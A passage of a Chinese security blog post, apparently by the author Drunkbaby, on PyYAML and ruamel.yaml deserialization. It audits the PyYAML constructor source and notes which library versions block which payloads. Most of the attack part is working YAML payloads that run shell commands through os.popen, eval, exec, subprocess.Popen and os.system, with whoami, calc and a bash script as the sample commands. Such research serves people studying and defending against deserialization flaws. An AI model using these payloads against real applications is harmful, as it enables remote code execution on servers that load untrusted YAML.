string">'KeyboardInterrupt'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'LookupError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'MemoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ModuleNotFoundError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NameError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotADirectoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotImplementedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OverflowError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PendingDeprecationWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PermissionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ProcessLookupError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RecursionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ReferenceError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ResourceWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RuntimeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RuntimeWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'StopAsyncIteration'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'StopIteration'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SyntaxError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SyntaxWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SystemError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SystemExit'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TabError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TimeoutError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TypeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnboundLocalError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeDecodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeEncodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeTranslateError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UserWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ValueError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Warning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ZeroDivisionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bool'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'filter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'map'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'zip'</span><span class="token operator">></span><span class="token punctuation">]</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>现在就是找可以利用的类了，继续回到我们的constructor.py中，</p>
+<p>进一步审计 construct_python_object_apply()时，存在一个漏洞点</p>
+
+
+<p>果listitems不为空，则调用instance的extend()方法，将listitems中的所有元素添加到instance列表对象的末尾，instance是我们创建的实例，这里并没有定义listitems是什么，如果我们的listitems是一个字典，而且其内容有”{‘extend’:function}”，这样的话，我们就可以利用extend进行任意函数的执行了。</p>
+<p>但是，经过测试，我发现上面 builtins 中的这些类中，只有frozenset,bytes,tuple这三个类可以进行命令执行，为了搞清楚为什么，我们继续审计源码。</p>
+<p>我们接着看 <code>make_python_instance()</code></p>
+
+
+<p>这里只要我们的内置类可以执行<code>cls.__new__(cls, *args, **kwds)</code>这段代码，就可以根据参数来动态创建新的Python对象，从而进行命令执行。</p>
+<p>所以猜测frozenset,bytes,tuple应该是可以执行上述代码，所以可以进行命令执行的</p>
+<p>测试payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">frozenset</span>  
+<span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">map</span>  
+  <span class="token operator">-</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span>os<span class="token punctuation">.</span>popen  
+  <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token string">"bash /app/fileinfo/cmd"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">tuple</span>  
+        <span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">map</span>  
+          <span class="token operator">-</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span><span class="token builtin">eval</span>  
+          <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token string">"print(123)"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再附上一些网上存在的 payload</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#报错但是执行了</span>
+<span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">str</span>
+    args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    state<span class="token punctuation">:</span> !!python<span class="token operator">/</span><span class="token builtin">tuple</span>
+    <span class="token operator">-</span> <span class="token string">"__import__('os').system('whoami')"</span>
+    <span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">staticmethod</span>
+      args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+      state<span class="token punctuation">:</span>
+        update<span class="token punctuation">:</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span><span class="token keyword">exec</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span>yaml<span class="token punctuation">.</span>MappingNode
+  listitems<span class="token punctuation">:</span> !!<span class="token builtin">str</span> <span class="token string">'!!python/object/apply:subprocess.Popen [whoami]'</span>
+  state<span class="token punctuation">:</span>
+    tag<span class="token punctuation">:</span> !!<span class="token builtin">str</span> dummy
+    value<span class="token punctuation">:</span> !!<span class="token builtin">str</span> dummy
+    extend<span class="token punctuation">:</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span>yaml<span class="token punctuation">.</span>unsafe_load<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数</span>
+!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">type</span>
+  args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"z"</span><span class="token punctuation">,</span> !!python<span class="token operator">/</span><span class="token builtin">tuple</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"extend"</span><span class="token punctuation">:</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span><span class="token keyword">exec</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>
+  listitems<span class="token punctuation">:</span> <span class="token string">"__import__('os').system('whoami')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>PS:</p>
+<p>当利用上述payload测试到5.2b1版本时，发现无法利用针对!!python&#x2F;object&#x2F;apply标签的payload了，别的都可以利用</p>
+<p>上述payload当我测试到5.4b1版本时，发现只有利用<code>针对!!python/name标签</code>的payload可以命令执行，别的payload都不能用了</p>
+<p>当版本大于等于5.3.1：<a class="link"   target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386" >https://github.com/yaml/pyyaml/pull/386<i class="fas fa-external-link-alt"></i></a></p>
+<p>当版本大于等于6.0： <a class="link"   target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386" >https://github.com/yaml/pyyaml/pull/386<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="3-利用ruamel-yaml读写yaml文件"><a href="#3-利用ruamel-yaml读写yaml文件" class="headerlink" title="3. 利用ruamel.yaml读写yaml文件"></a>3. 利用ruamel.yaml读写yaml文件</h3><p>在网上搜资料的时候，Evi1s7 师傅发现了也可以利用 ruamel.yaml 读写 yaml 文件，进行测试一下。</p>
+<p>这里还是沿用 PyYaml&gt;5.1 的 poc</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ruamel<span class="token punctuation">.</span>yaml
+
+poc<span class="token operator">=</span> <span class="token triple-quoted-string string">b"""!!python/object/apply:os.system
+- calc"""</span>
+
+ruamel<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>虽然回显报错，但是仍然可以执行，所以利用ruamel.yaml读写yaml文件也是存在上述的漏洞的，这里就不再测试。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>入职后实在是没精力写这些文章了，时间太碎了，后续或许有时间会再回过头来看看</p>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12481" >https://xz.aliyun.com/t/12481<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/" >https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/<i class="fas fa-external-link-alt"></i></a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Python yaml 反序列化</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-06-02 16:29:18</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/06/02/Python-yaml-反序列化/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">#web安全</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/06/01/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java 设计模式之单例模式</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Py-Yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">Py Yaml 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Python-%E4%B8%AD%E7%9A%84%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-text">Python 中的强制类型转换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-text">高级类型转换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PyYaml-lt-5-1-%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">PyYaml &lt; 5.1 的序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98-Py-YAML-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">深入挖掘 Py YAML 序列化与反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PyYaml-gt-x3D-5-1-%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">PyYaml &gt;&#x3D; 5.1 的序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B2%BF%E7%94%A8-PyYaml-lt-x3D-5-1-%E7%9A%84-poc"><span class="nav-text">1.沿用 PyYaml&lt;&#x3D;5.1 的 poc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8-builtins-%E6%A8%A1%E5%9D%97%E4%B8%AD%E7%9A%84%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">2.利用 builtins 模块中的内置函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8ruamel-yaml%E8%AF%BB%E5%86%99yaml%E6%96%87%E4%BB%B6"><span class="nav-text">3. 利用ruamel.yaml读写yaml文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ref"><span class="nav-text">Ref</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
